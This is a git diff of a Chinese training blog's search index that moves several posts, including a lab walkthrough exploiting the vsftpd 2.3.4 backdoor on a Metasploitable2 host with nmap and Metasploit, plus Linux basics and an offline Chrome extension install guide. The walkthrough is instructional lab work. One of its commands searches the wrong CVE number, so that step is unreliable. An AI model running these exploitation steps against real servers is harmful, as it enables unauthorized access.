@@ -1,6 +1,78 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>vsftpd漏洞复现</title>
+    <url>/doc/30165/</url>
+    <content><![CDATA[<blockquote>
+<p>漏洞说明 : </p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp; 在vsftpd的2.3.4版本存在一个恶意的后门 , 虽然该问题迅速得到了开发人员的修复及删除 , 但是仍有不少人已经下载安装了该漏洞版本.</p>
+<ul>
+<li>发布时间 : 2011-07-03.</li>
+<li>影响范围 : 仅针对vsftpd 2.3.4版本.</li>
+<li>漏洞编号 : CVE-2011-2523.</li>
+</ul>
+</blockquote>
+<a id="more"></a>
+
+
+
+<p><strong>环境声明</strong> : </p>
+<table>
+<thead>
+<tr>
+<th align="left">角色</th>
+<th align="left">操作系统</th>
+<th align="left">IP地址</th>
+<th align="left">工具</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">攻击机</td>
+<td align="left">Kali Linux 2020.2 64位</td>
+<td align="left">192.168.0.102</td>
+<td align="left">msf , nmap , ping</td>
+</tr>
+<tr>
+<td align="left">靶机</td>
+<td align="left">Metasploitable2</td>
+<td align="left">192.168.0.103</td>
+<td align="left"></td>
+</tr>
+</tbody></table>
+<hr>
+<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><h4 id="获取靶机操作系统"><a href="#获取靶机操作系统" class="headerlink" title="获取靶机操作系统"></a>获取靶机操作系统</h4><p><strong>命令</strong> : <code>nmap -O 192.168.0.103</code> </p>
+<p><img src="https://cdn.jsdelivr.net/gh/yuanhe-xia/ImageHost/imgs/20200827140324.png" alt=""></p>
+<h4 id="获取靶机开放服务"><a href="#获取靶机开放服务" class="headerlink" title="获取靶机开放服务"></a>获取靶机开放服务</h4><p><strong>命令</strong> : <code>nmap -sV 192.168.0.103</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/yuanhe-xia/ImageHost/imgs/20200827140344.png" alt=""></p>
+<hr>
+<h3 id="漏洞探测"><a href="#漏洞探测" class="headerlink" title="漏洞探测"></a>漏洞探测</h3><p><strong>命令</strong> : </p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">xiahan@kali:~$ sudo nmap --script=vuln -p21 192.168.0.103	<span class="hljs-comment">#针对21号端口开放的服务进行漏洞脚本扫描.</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/yuanhe-xia/ImageHost/imgs/20200827140356.png" alt=""></p>
+<hr>
+<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><h4 id="使用模块"><a href="#使用模块" class="headerlink" title="使用模块"></a>使用模块</h4><p><strong>命令</strong> : </p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">xiahan@kali:~$ sudo msfconsole				<span class="hljs-comment">#启动MSF</span><br>msf5 &gt; search cve-2017-7494				<span class="hljs-comment">#搜索漏洞相关模块</span><br>msf5 &gt; use exploit/unix/ftp/vsftpd_234_backdoor		<span class="hljs-comment">#使用该模块</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/yuanhe-xia/ImageHost/imgs/20200827140408.png" alt=""></p>
+<h4 id="设置模块参数"><a href="#设置模块参数" class="headerlink" title="设置模块参数"></a>设置模块参数</h4><p><strong>命令</strong> : </p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">msf5 exploit(unix/ftp/vsftpd_234_backdoor) &gt; <span class="hljs-built_in">set</span> RHOSTS 192.168.0.103<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/yuanhe-xia/ImageHost/imgs/20200827140421.png" alt=""></p>
+<h4 id="执行攻击-建立会话"><a href="#执行攻击-建立会话" class="headerlink" title="执行攻击 , 建立会话"></a>执行攻击 , 建立会话</h4><p><strong>命令</strong> :</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">msf5 exploit(unix/ftp/vsftpd_234_backdoor) &gt; exploit<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/yuanhe-xia/ImageHost/imgs/20200827140439.png" alt=""></p>
+]]></content>
+      <categories>
+        <category>漏洞复现</category>
+        <category>网络空间</category>
+      </categories>
+      <tags>
+        <tag>培训</tag>
+        <tag>Linux漏洞</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>2020重庆市赛分析</title>
     <url>/doc/61537/</url>
     <content><![CDATA[<blockquote>
@@ -153,78 +225,6 @@
       </categories>
       <tags>
         <tag>培训</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>vsftpd漏洞复现</title>
-    <url>/doc/30165/</url>
-    <content><![CDATA[<blockquote>
-<p>漏洞说明 : </p>
-<p>&nbsp;&nbsp;&nbsp;&nbsp; 在vsftpd的2.3.4版本存在一个恶意的后门 , 虽然该问题迅速得到了开发人员的修复及删除 , 但是仍有不少人已经下载安装了该漏洞版本.</p>
-<ul>
-<li>发布时间 : 2011-07-03.</li>
-<li>影响范围 : 仅针对vsftpd 2.3.4版本.</li>
-<li>漏洞编号 : CVE-2011-2523.</li>
-</ul>
-</blockquote>
-<a id="more"></a>
-
-
-
-<p><strong>环境声明</strong> : </p>
-<table>
-<thead>
-<tr>
-<th align="left">角色</th>
-<th align="left">操作系统</th>
-<th align="left">IP地址</th>
-<th align="left">工具</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="left">攻击机</td>
-<td align="left">Kali Linux 2020.2 64位</td>
-<td align="left">192.168.0.102</td>
-<td align="left">msf , nmap , ping</td>
-</tr>
-<tr>
-<td align="left">靶机</td>
-<td align="left">Metasploitable2</td>
-<td align="left">192.168.0.103</td>
-<td align="left"></td>
-</tr>
-</tbody></table>
-<hr>
-<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><h4 id="获取靶机操作系统"><a href="#获取靶机操作系统" class="headerlink" title="获取靶机操作系统"></a>获取靶机操作系统</h4><p><strong>命令</strong> : <code>nmap -O 192.168.0.103</code> </p>
-<p><img src="https://cdn.jsdelivr.net/gh/yuanhe-xia/ImageHost/imgs/20200827140324.png" alt=""></p>
-<h4 id="获取靶机开放服务"><a href="#获取靶机开放服务" class="headerlink" title="获取靶机开放服务"></a>获取靶机开放服务</h4><p><strong>命令</strong> : <code>nmap -sV 192.168.0.103</code></p>
-<p><img src="https://cdn.jsdelivr.net/gh/yuanhe-xia/ImageHost/imgs/20200827140344.png" alt=""></p>
-<hr>
-<h3 id="漏洞探测"><a href="#漏洞探测" class="headerlink" title="漏洞探测"></a>漏洞探测</h3><p><strong>命令</strong> : </p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">xiahan@kali:~$ sudo nmap --script=vuln -p21 192.168.0.103	<span class="hljs-comment">#针对21号端口开放的服务进行漏洞脚本扫描.</span><br></code></pre></td></tr></table></figure>
-
-<p><img src="https://cdn.jsdelivr.net/gh/yuanhe-xia/ImageHost/imgs/20200827140356.png" alt=""></p>
-<hr>
-<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><h4 id="使用模块"><a href="#使用模块" class="headerlink" title="使用模块"></a>使用模块</h4><p><strong>命令</strong> : </p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">xiahan@kali:~$ sudo msfconsole				<span class="hljs-comment">#启动MSF</span><br>msf5 &gt; search cve-2017-7494				<span class="hljs-comment">#搜索漏洞相关模块</span><br>msf5 &gt; use exploit/unix/ftp/vsftpd_234_backdoor		<span class="hljs-comment">#使用该模块</span><br></code></pre></td></tr></table></figure>
-
-<p><img src="https://cdn.jsdelivr.net/gh/yuanhe-xia/ImageHost/imgs/20200827140408.png" alt=""></p>
-<h4 id="设置模块参数"><a href="#设置模块参数" class="headerlink" title="设置模块参数"></a>设置模块参数</h4><p><strong>命令</strong> : </p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">msf5 exploit(unix/ftp/vsftpd_234_backdoor) &gt; <span class="hljs-built_in">set</span> RHOSTS 192.168.0.103<br></code></pre></td></tr></table></figure>
-
-<p><img src="https://cdn.jsdelivr.net/gh/yuanhe-xia/ImageHost/imgs/20200827140421.png" alt=""></p>
-<h4 id="执行攻击-建立会话"><a href="#执行攻击-建立会话" class="headerlink" title="执行攻击 , 建立会话"></a>执行攻击 , 建立会话</h4><p><strong>命令</strong> :</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">msf5 exploit(unix/ftp/vsftpd_234_backdoor) &gt; exploit<br></code></pre></td></tr></table></figure>
-
-<p><img src="https://cdn.jsdelivr.net/gh/yuanhe-xia/ImageHost/imgs/20200827140439.png" alt=""></p>
-]]></content>
-      <categories>
-        <category>漏洞复现</category>
-        <category>网络空间</category>
-      </categories>
-      <tags>
-        <tag>培训</tag>
-        <tag>Linux漏洞</tag>
       </tags>
   </entry>
   <entry>
@@ -524,121 +524,6 @@
       </tags>
   </entry>
   <entry>
-    <title>基础篇</title>
-    <url>/doc/6314/</url>
-    <content><![CDATA[<blockquote>
-<p>写在前面的话:</p>
-<ul>
-<li>本文的定性为扫盲入门篇,仅对部分培训内容做<strong>简略</strong>讲解.</li>
-<li>因为照顾完全无基础的同学的关系,所以我会将部分专业术语转为更加容易理解的白话.</li>
-<li>若部分内容与黄老师,吴老师授课内容发生冲突,请以老师授课内容为准.</li>
-<li>由于个人水平限制, 若在阅读过程中发现错误或遗漏.欢迎评论留言告知,</li>
-</ul>
-</blockquote>
-<a id="more"></a>
-
-<hr>
-<hr>
-<h2 id="Linux篇"><a href="#Linux篇" class="headerlink" title="Linux篇"></a>Linux篇</h2><hr>
-<h3 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h3><p><strong>概念</strong> : 是一款<strong>免费 , 源代码开放</strong>的操作系统. 具有不同的发行版本.  <em>(与此相对的便是我们日常最多的windows操作系统,但windows是闭源且收费的操作系统)</em></p>
-<p><strong>组成</strong> : Linux一般由四个主要部分组成:</p>
-<ul>
-<li><strong>内核</strong> : 是Linux系统的心脏,是运行程序和管理磁盘等硬件的<strong>核心程序</strong>. </li>
-<li><strong>Shell</strong> : 是系统的用户界面,提供用户与内核进行交互操作的一种接口.实际上是一个<strong>命令解释器</strong>.同时又可作为一种<strong>编程语言</strong>.</li>
-<li><strong>文件系统</strong> : 文件存放在硬盘等存储设备上的<strong>组织方法</strong>. </li>
-<li><strong>应用程序</strong> : 包含应用程序的<strong>程序集</strong>. 例:编程语言 , 办公套件, 数据库等.</li>
-</ul>
-<p><strong>发行版本</strong> : 一些组织或厂家将Linux系统内核与应用软件和文档<strong>包装</strong>起来,并提供一些安装界面和系统设定管理工具的软件包的<strong>集合</strong> . 常见的发行版本有以下几种: </p>
-<ul>
-<li>CentOS</li>
-<li>Ubuntu</li>
-<li>Debian</li>
-</ul>
-<hr>
-<h3 id="术语解释"><a href="#术语解释" class="headerlink" title="术语解释:"></a>术语解释:</h3><ol>
-<li><p>文件 : 在Linux上 , 文件被看作是<strong>字节序列</strong>. <strong>Linux中一切皆是文件</strong>.包括键盘,显示器等硬件,但文件有<strong>不同的类型</strong>.</p>
-</li>
-<li><p>目录 : windows中通称为<strong>文件夹</strong> .在Linux中目录也是一种特殊的文件类型.</p>
-</li>
-<li><p>符号链接 : 在windows中通称为<strong>快捷方式</strong> . 在Linux中符号链接也是一种特殊的文件类型.</p>
-</li>
-<li><p>命令名 : 执行命令的名字 , 如果终端在<code>程序的目录中打开</code>或者程序的路径包含在<code>环境变量</code>中可直接用命令名,否则需加上 <code>路径</code> .  用windows中最常用的QQ来举个抽象点的栗子.如下图:</p>
-<img src="https://cdn.jsdelivr.net/gh/yuanhe-xia/ImageHost/imgs/20200823233503.png" alt="1_一个栗子" style="zoom:50%;" />
-
-<p>​    该图中QQ.exe就是命令名 , 如果启动QQ就得在图中文件夹的位置打开终端 , 执行<code>QQ.exe</code>这条命令,如果想在其他目录启动该程序,就得在命令名前加上完整的路径<code>计算机\software\Software\Tencent\QQ\Bin\QQ.exe</code> .之后再根据需要加上参数和选项.</p>
-</li>
-<li><p>选项和参数 : 程序运行中<strong>必须或非必须</strong>的东西 . 还是用上面QQ来举栗.如下图:</p>
-<p><img src="https://cdn.jsdelivr.net/gh/yuanhe-xia/ImageHost/imgs/20200823233517.png" alt=""></p>
-<p>&nbsp;&nbsp;&nbsp;&nbsp;我们可以看到如果想运行QQ这个程序则必须提供<code>两个参数</code> <em>(QQ号码和密码)</em> 以及一个<code>选项</code> <em>(登录)</em>. 只有提供了这些才能完成程序的功能<em>(登录QQ)</em>.当然,这个栗子实际上还有点欠缺 , 比如说我们在输入参数和选项时大多数是直接将命令和参数一起输入.而不是像这个栗子让你运行了命令再让你输入参数.</p>
-</li>
-<li><p>shell : 简单的来说就是提供用户与内核的接口 , 分为<strong>图形shell</strong>和<strong>文本shell</strong>两种<em>(两种方式之间如何切换这里不做过多的讲解)</em>.</p>
-<p><img src="https://cdn.jsdelivr.net/gh/yuanhe-xia/ImageHost/imgs/20200823233529.png" alt=""></p>
-<p><img src="https://cdn.jsdelivr.net/gh/yuanhe-xia/ImageHost/imgs/20200823233541.png" alt=""></p>
-</li>
-</ol>
-<ol start="7">
-<li><p>终端:执行shell命令的地方<em>(文本shell也算一种终端)</em>,如下图 : </p>
-<p><img src="https://cdn.jsdelivr.net/gh/yuanhe-xia/ImageHost/imgs/20200823233549.png" alt=""></p>
-</li>
-</ol>
-<hr>
-<h3 id="Shell命令"><a href="#Shell命令" class="headerlink" title="Shell命令"></a>Shell命令</h3><p>实现流程图:</p>
-<p><img src="https://cdn.jsdelivr.net/gh/yuanhe-xia/ImageHost/imgs/20200823233636.jpg" alt=""></p>
-<p>实现流程:</p>
-<p>&nbsp;&nbsp;&nbsp;&nbsp; ps. 这里的<strong>系统功能调用并转交给内核执行</strong>可理解为<strong>执行命令</strong></p>
-<p>&nbsp;&nbsp;&nbsp;&nbsp; 当用户提交了一个命令后,Shell首先判断是否为内置命令,如果是就通过shell的解释器将其为系统功能调用并转交给内核执行; 若是外部命令或实用程序,就试图在硬盘中查找该命令并将其调入内存,再将其解释为系统功能调用并转交给内核执行. 在查找该命令时分为两种情况:</p>
-<ol>
-<li>用户<strong>给出了命令的路径</strong> , shell就沿着用户给出的路径进行查找,若找到则调入内存,若没找到则输出提示信息.</li>
-<li>用户<strong>没有给出命令的路径</strong> , shell就在环境变量<code>PATH</code>所指定的路径中依次进行查找,若找到则调入系统内存 , 若没找到则输出提示信息.</li>
-</ol>
-<p>举例<em>(以列出文件的<code>ls</code>命令为例)</em>:</p>
-<p><img src="https://cdn.jsdelivr.net/gh/yuanhe-xia/ImageHost/imgs/20200823233603.png" alt=""></p>
-<p>接下来我们看一下环境变量:</p>
-<p><img src="https://cdn.jsdelivr.net/gh/yuanhe-xia/ImageHost/imgs/20200823233612.png" alt=""></p>
-<p>Shell命令的一般格式为 : </p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">ls [-options]  [arguments]<br></code></pre></td></tr></table></figure>
-
-<p>其中,<code>ls</code>是<strong>命令名</strong> ; option是<strong>选项</strong> ; arguments是<strong>参数</strong> , 即被该条命令操作的对象.</p>
-<p>说明:</p>
-<ol>
-<li>命令名一般为英文单词的缩写. 比如<code>cp</code> 命令的英文单词为<code>copy(拷贝)</code> , <code>pwd</code> 命令的英文单词为<code>Print working directory(显示当前工作路径)</code> , 但切记<strong>不可将英文单词作为命令名输入</strong>.</li>
-<li>在上面的一般格式中我们可以看到<code>[-options]</code>,  包裹着<code>options</code>的<code>[]</code>代表<strong>可选项</strong> <em>(意为可有可无)</em> . 与之相对的还有这代表<strong>必选项</strong> <em>(必须要有该选项或参数,否则该命令无法运行)</em> 的<code>&lt;&gt;</code>及<strong>多选项</strong> <em>(在a或者b中间选一个)</em> 的<code>{a|b}</code> . 这些符号在运行shell命令时<strong>不用输入 , 仅在帮助理解一些shell和用法</strong>. </li>
-</ol>
-<p>补充 : </p>
-<ul>
-<li><p>最简单的Shell命令只有命令名<em>(这也是上图为什么将选项和参数设为可选项的原因)</em> , 复杂的shell命令可以有多个选项和参数.</p>
-</li>
-<li><p>选项和命令之间用空格分隔开来.</p>
-</li>
-<li><p>操作对象<em>(arguments)</em> 可以是文件也可以是目录 , 有些命令必须使用多个操作对象<em>(则有两个必选项)</em>.</p>
-<hr>
-</li>
-</ul>
-<p>  必须掌握的几个shell命令:</p>
-<p>  学习网站 : <a href="https://www.runoob.com/linux/linux-command-manual.html" target="_blank" rel="noopener">链接</a></p>
-<ul>
-<li>cd : 切换目录.</li>
-<li>ls : 列出当前目录下的文件.</li>
-<li>pwd : 列出当前工作目录.</li>
-<li>mkdir : 创建目录.</li>
-<li>touch : 创建空文件.</li>
-<li>mv : 移动/重命名文件.</li>
-<li>cp : 复制文件.</li>
-<li>cat : 查看文件内容.</li>
-<li><del>vim</del> : 文本编辑工具,这个我会单独讲.</li>
-<li>ifconfig : 查看网络状态.</li>
-<li>ipconfig : 查看网络状态.与上面那个不同的是这个是dos命令 , 仅在windows中使用.</li>
-</ul>
-<hr>
-]]></content>
-      <categories>
-        <category>网络空间</category>
-      </categories>
-      <tags>
-        <tag>培训</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>v2ray客户端配置(v2rayN和SwitchyOmega)</title>
     <url>/doc/49460/</url>
     <content><![CDATA[<p>v2ray客户端配置(v2rayN和SwitchyOmega)</p>
@@ -851,6 +736,121 @@
 <p><img src="https://cdn.jsdelivr.net/gh/yuanhe-xia/ImageHost/imgs/20200823224920.png" alt=""></p>
 </li>
 </ol>
+]]></content>
+      <categories>
+        <category>网络空间</category>
+      </categories>
+      <tags>
+        <tag>培训</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>基础篇</title>
+    <url>/doc/6314/</url>
+    <content><![CDATA[<blockquote>
+<p>写在前面的话:</p>
+<ul>
+<li>本文的定性为扫盲入门篇,仅对部分培训内容做<strong>简略</strong>讲解.</li>
+<li>因为照顾完全无基础的同学的关系,所以我会将部分专业术语转为更加容易理解的白话.</li>
+<li>若部分内容与黄老师,吴老师授课内容发生冲突,请以老师授课内容为准.</li>
+<li>由于个人水平限制, 若在阅读过程中发现错误或遗漏.欢迎评论留言告知,</li>
+</ul>
+</blockquote>
+<a id="more"></a>
+
+<hr>
+<hr>
+<h2 id="Linux篇"><a href="#Linux篇" class="headerlink" title="Linux篇"></a>Linux篇</h2><hr>
+<h3 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h3><p><strong>概念</strong> : 是一款<strong>免费 , 源代码开放</strong>的操作系统. 具有不同的发行版本.  <em>(与此相对的便是我们日常最多的windows操作系统,但windows是闭源且收费的操作系统)</em></p>
+<p><strong>组成</strong> : Linux一般由四个主要部分组成:</p>
+<ul>
+<li><strong>内核</strong> : 是Linux系统的心脏,是运行程序和管理磁盘等硬件的<strong>核心程序</strong>. </li>
+<li><strong>Shell</strong> : 是系统的用户界面,提供用户与内核进行交互操作的一种接口.实际上是一个<strong>命令解释器</strong>.同时又可作为一种<strong>编程语言</strong>.</li>
+<li><strong>文件系统</strong> : 文件存放在硬盘等存储设备上的<strong>组织方法</strong>. </li>
+<li><strong>应用程序</strong> : 包含应用程序的<strong>程序集</strong>. 例:编程语言 , 办公套件, 数据库等.</li>
+</ul>
+<p><strong>发行版本</strong> : 一些组织或厂家将Linux系统内核与应用软件和文档<strong>包装</strong>起来,并提供一些安装界面和系统设定管理工具的软件包的<strong>集合</strong> . 常见的发行版本有以下几种: </p>
+<ul>
+<li>CentOS</li>
+<li>Ubuntu</li>
+<li>Debian</li>
+</ul>
+<hr>
+<h3 id="术语解释"><a href="#术语解释" class="headerlink" title="术语解释:"></a>术语解释:</h3><ol>
+<li><p>文件 : 在Linux上 , 文件被看作是<strong>字节序列</strong>. <strong>Linux中一切皆是文件</strong>.包括键盘,显示器等硬件,但文件有<strong>不同的类型</strong>.</p>
+</li>
+<li><p>目录 : windows中通称为<strong>文件夹</strong> .在Linux中目录也是一种特殊的文件类型.</p>
+</li>
+<li><p>符号链接 : 在windows中通称为<strong>快捷方式</strong> . 在Linux中符号链接也是一种特殊的文件类型.</p>
+</li>
+<li><p>命令名 : 执行命令的名字 , 如果终端在<code>程序的目录中打开</code>或者程序的路径包含在<code>环境变量</code>中可直接用命令名,否则需加上 <code>路径</code> .  用windows中最常用的QQ来举个抽象点的栗子.如下图:</p>
+<img src="https://cdn.jsdelivr.net/gh/yuanhe-xia/ImageHost/imgs/20200823233503.png" alt="1_一个栗子" style="zoom:50%;" />
+
+<p>​    该图中QQ.exe就是命令名 , 如果启动QQ就得在图中文件夹的位置打开终端 , 执行<code>QQ.exe</code>这条命令,如果想在其他目录启动该程序,就得在命令名前加上完整的路径<code>计算机\software\Software\Tencent\QQ\Bin\QQ.exe</code> .之后再根据需要加上参数和选项.</p>
+</li>
+<li><p>选项和参数 : 程序运行中<strong>必须或非必须</strong>的东西 . 还是用上面QQ来举栗.如下图:</p>
+<p><img src="https://cdn.jsdelivr.net/gh/yuanhe-xia/ImageHost/imgs/20200823233517.png" alt=""></p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;我们可以看到如果想运行QQ这个程序则必须提供<code>两个参数</code> <em>(QQ号码和密码)</em> 以及一个<code>选项</code> <em>(登录)</em>. 只有提供了这些才能完成程序的功能<em>(登录QQ)</em>.当然,这个栗子实际上还有点欠缺 , 比如说我们在输入参数和选项时大多数是直接将命令和参数一起输入.而不是像这个栗子让你运行了命令再让你输入参数.</p>
+</li>
+<li><p>shell : 简单的来说就是提供用户与内核的接口 , 分为<strong>图形shell</strong>和<strong>文本shell</strong>两种<em>(两种方式之间如何切换这里不做过多的讲解)</em>.</p>
+<p><img src="https://cdn.jsdelivr.net/gh/yuanhe-xia/ImageHost/imgs/20200823233529.png" alt=""></p>
+<p><img src="https://cdn.jsdelivr.net/gh/yuanhe-xia/ImageHost/imgs/20200823233541.png" alt=""></p>
+</li>
+</ol>
+<ol start="7">
+<li><p>终端:执行shell命令的地方<em>(文本shell也算一种终端)</em>,如下图 : </p>
+<p><img src="https://cdn.jsdelivr.net/gh/yuanhe-xia/ImageHost/imgs/20200823233549.png" alt=""></p>
+</li>
+</ol>
+<hr>
+<h3 id="Shell命令"><a href="#Shell命令" class="headerlink" title="Shell命令"></a>Shell命令</h3><p>实现流程图:</p>
+<p><img src="https://cdn.jsdelivr.net/gh/yuanhe-xia/ImageHost/imgs/20200823233636.jpg" alt=""></p>
+<p>实现流程:</p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp; ps. 这里的<strong>系统功能调用并转交给内核执行</strong>可理解为<strong>执行命令</strong></p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp; 当用户提交了一个命令后,Shell首先判断是否为内置命令,如果是就通过shell的解释器将其为系统功能调用并转交给内核执行; 若是外部命令或实用程序,就试图在硬盘中查找该命令并将其调入内存,再将其解释为系统功能调用并转交给内核执行. 在查找该命令时分为两种情况:</p>
+<ol>
+<li>用户<strong>给出了命令的路径</strong> , shell就沿着用户给出的路径进行查找,若找到则调入内存,若没找到则输出提示信息.</li>
+<li>用户<strong>没有给出命令的路径</strong> , shell就在环境变量<code>PATH</code>所指定的路径中依次进行查找,若找到则调入系统内存 , 若没找到则输出提示信息.</li>
+</ol>
+<p>举例<em>(以列出文件的<code>ls</code>命令为例)</em>:</p>
+<p><img src="https://cdn.jsdelivr.net/gh/yuanhe-xia/ImageHost/imgs/20200823233603.png" alt=""></p>
+<p>接下来我们看一下环境变量:</p>
+<p><img src="https://cdn.jsdelivr.net/gh/yuanhe-xia/ImageHost/imgs/20200823233612.png" alt=""></p>
+<p>Shell命令的一般格式为 : </p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">ls [-options]  [arguments]<br></code></pre></td></tr></table></figure>
+
+<p>其中,<code>ls</code>是<strong>命令名</strong> ; option是<strong>选项</strong> ; arguments是<strong>参数</strong> , 即被该条命令操作的对象.</p>
+<p>说明:</p>
+<ol>
+<li>命令名一般为英文单词的缩写. 比如<code>cp</code> 命令的英文单词为<code>copy(拷贝)</code> , <code>pwd</code> 命令的英文单词为<code>Print working directory(显示当前工作路径)</code> , 但切记<strong>不可将英文单词作为命令名输入</strong>.</li>
+<li>在上面的一般格式中我们可以看到<code>[-options]</code>,  包裹着<code>options</code>的<code>[]</code>代表<strong>可选项</strong> <em>(意为可有可无)</em> . 与之相对的还有这代表<strong>必选项</strong> <em>(必须要有该选项或参数,否则该命令无法运行)</em> 的<code>&lt;&gt;</code>及<strong>多选项</strong> <em>(在a或者b中间选一个)</em> 的<code>{a|b}</code> . 这些符号在运行shell命令时<strong>不用输入 , 仅在帮助理解一些shell和用法</strong>. </li>
+</ol>
+<p>补充 : </p>
+<ul>
+<li><p>最简单的Shell命令只有命令名<em>(这也是上图为什么将选项和参数设为可选项的原因)</em> , 复杂的shell命令可以有多个选项和参数.</p>
+</li>
+<li><p>选项和命令之间用空格分隔开来.</p>
+</li>
+<li><p>操作对象<em>(arguments)</em> 可以是文件也可以是目录 , 有些命令必须使用多个操作对象<em>(则有两个必选项)</em>.</p>
+<hr>
+</li>
+</ul>
+<p>  必须掌握的几个shell命令:</p>
+<p>  学习网站 : <a href="https://www.runoob.com/linux/linux-command-manual.html" target="_blank" rel="noopener">链接</a></p>
+<ul>
+<li>cd : 切换目录.</li>
+<li>ls : 列出当前目录下的文件.</li>
+<li>pwd : 列出当前工作目录.</li>
+<li>mkdir : 创建目录.</li>
+<li>touch : 创建空文件.</li>
+<li>mv : 移动/重命名文件.</li>
+<li>cp : 复制文件.</li>
+<li>cat : 查看文件内容.</li>
+<li><del>vim</del> : 文本编辑工具,这个我会单独讲.</li>
+<li>ifconfig : 查看网络状态.</li>
+<li>ipconfig : 查看网络状态.与上面那个不同的是这个是dos命令 , 仅在windows中使用.</li>
+</ul>
+<hr>
 ]]></content>
       <categories>
         <category>网络空间</category>
@@ -1145,74 +1145,6 @@
       </tags>
   </entry>
   <entry>
-    <title>谷歌浏览器插件安装</title>
-    <url>/doc/1720/</url>
-    <content><![CDATA[<blockquote>
-<p>写在前面的话:</p>
-<p>​    本人建议境外人士或通过公安授权等合法手段能访问谷歌在线商店的人.通过谷歌在线商店安装插件.</p>
-<p>​    本人不提倡,不建议,不诱导在境内通过连接VPN , 挂代理等非法手段绕过GFW封锁从谷歌在线商店安装谷歌插件.</p>
-</blockquote>
-<a id="more"></a>
-
-<hr>
-<h2 id="安装插件的方法"><a href="#安装插件的方法" class="headerlink" title="安装插件的方法"></a>安装插件的方法</h2><ul>
-<li><del>在线安装</del></li>
-<li>离线安装<ul>
-<li><del>crx 安装</del>  <em>(受限于浏览器与插件版本 , 现目前大多数插件无法通过该方式安装)</em> </li>
-<li>crx 转为 rar 压缩包解压安装.</li>
-</ul>
-</li>
-</ul>
-<hr>
-<hr>
-<h2 id="安装插件"><a href="#安装插件" class="headerlink" title="安装插件"></a>安装插件</h2><h3 id="crx安装"><a href="#crx安装" class="headerlink" title="crx安装"></a>crx安装</h3><ol>
-<li>打开插件管理页面 <code>更多工具--&gt;扩展程序</code> .</li>
-<li>拖动crx文件到该页面中. <em>(未实验成功故无图)</em> </li>
-</ol>
-<hr>
-<h3 id="rar-压缩包解压安装"><a href="#rar-压缩包解压安装" class="headerlink" title="rar 压缩包解压安装"></a>rar 压缩包解压安装</h3><p>本次实验以 <code>Aria2 for chrome</code> 插件为例 : </p>
-<ol>
-<li><p>在插件下载网站 <em>(插件网站我放在最后)</em> 下载crx插件. </p>
-</li>
-<li><p>下载插件后将后缀改为 <code>.rar</code> , 并将其解压至一个文件夹. </p>
-<p><img src="https://cdn.jsdelivr.net/gh/yuanhe-xia/ImageHost/imgs/20200823233657.gif" alt=""></p>
-</li>
-</ol>
-<ol start="3">
-<li><p>在浏览器 <code>更多工具--&gt;扩展程序</code> 处打开插件管理. </p>
-<p><img src="https://cdn.jsdelivr.net/gh/yuanhe-xia/ImageHost/imgs/20200823233705.png" alt=""></p>
-</li>
-</ol>
-<ol start="4">
-<li><p>依次点击 <code>开发者模式--&gt;加载已解压的扩展程序</code> , 在弹出来的界面中选择插件解压的文件夹. </p>
-<p><img src="https://cdn.jsdelivr.net/gh/yuanhe-xia/ImageHost/imgs/20200823233720.gif" alt=""></p>
-</li>
-</ol>
-<ol start="5">
-<li><p>添加成功. </p>
-<p><img src="https://cdn.jsdelivr.net/gh/yuanhe-xia/ImageHost/imgs/20200823233730.png" alt=""></p>
-</li>
-</ol>
-<hr>
-<hr>
-<h2 id="插件网站"><a href="#插件网站" class="headerlink" title="插件网站"></a>插件网站</h2><ul>
-<li><p><a href="https://github.com/search" target="_blank" rel="noopener">Github</a> : 大多数插件都是开源的,可通过此网站搜索到一部分插件.个人比较推荐这个.</p>
-</li>
-<li><p><a href="https://www.crx4chrome.com/" target="_blank" rel="noopener">crx4chrome</a> : 包含众多谷歌插件,含插件历史版本(好评),境内可访问,但网站的验证码有点难受.</p>
-</li>
-<li><p><a href="https://crxdl.com/" target="_blank" rel="noopener">crxdl</a> : 境内可访问,网站访问速度还挺快的.不过有些插件搜不到,网站验证机制和上面那个一样.</p>
-</li>
-</ul>
-<hr>
-]]></content>
-      <categories>
-        <category>杂项</category>
-      </categories>
-      <tags>
-        <tag>其他</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>软件推荐</title>
     <url>/doc/34021/</url>
     <content><![CDATA[<blockquote>
@@ -1299,6 +1231,74 @@
